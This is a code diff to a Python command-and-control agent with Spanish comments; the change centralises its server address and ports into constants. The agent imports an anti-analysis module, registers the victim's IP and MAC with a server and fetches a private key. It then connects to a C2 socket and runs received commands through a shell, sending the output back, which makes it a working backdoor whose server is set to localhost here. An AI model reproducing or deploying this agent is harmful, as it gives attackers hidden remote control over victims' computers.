@@ -6,6 +6,11 @@ import platform
 import antianalysis
 import subprocess
 
+SERVER_IP = "127.0.0.1"
+HTTP_PORT = 5000
+C2_PORT = 5001
+BASE_URL = f"http://{SERVER_IP}:{HTTP_PORT}"
+
 def get_ip_address():
     ip = socket.gethostbyname(socket.gethostname())
     return ip
@@ -40,7 +45,7 @@ def register_agent():
     if private_key is None:
         print("No se pudo cargar la clave privada. No se puede registrar el agente.")
         return None
-    server_url = 'http://127.0.0.1:5000/register_agent'
+    server_url = f"{BASE_URL}/register_agent"
     data = {
         'ip': ip,
         'mac': mac,
@@ -65,7 +70,7 @@ def get_private_key():
     if agent_id is None:
         print("No se ha registrado un agente. No se puede obtener la clave privada.")
         return None
-    server_url = f'http://127.0.0.1:5000/download_private_key/{agent_id}'
+    server_url = f"{BASE_URL}/download_private_key/{agent_id}"
     response = requests.get(server_url)
     if response.status_code == 200:
         with open('rsa_private.pem', 'wb') as f:
@@ -76,15 +81,13 @@ def get_private_key():
 
     # Función para conectar el agente al servidor de sockets
 def connect_to_c2_server():
-    server_host = '127.0.0.1' # IP del servidor c2
-    server_port = 5001  # Puerto servidor c2
     agent_id = get_agent_id()  # Obtener el ID antes de conectarse
     if agent_id is None:
         print("Error: No se encontró el ID del agente. Regístrate primero.")
         return  
     try:
         agent_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        agent_socket.connect((server_host, server_port))
+        agent_socket.connect((SERVER_IP, C2_PORT))
         print(f"Agente {agent_id} conectado al servidor.")
         agent_socket.send(str(agent_id).encode('utf-8')) # Enviar el ID del agente al servidor
 
@@ -104,7 +107,6 @@ def connect_to_c2_server():
                 else:
                     # Ejecutar el comando y obtener el resultado
                     result = subprocess.run(command, shell=True, capture_output=True, text=True)
-
                     if result.stdout: # Si el comando produjo salida, enviarla
                         output = result.stdout
                     elif result.stderr:# Si el comando produjo error, enviarlo
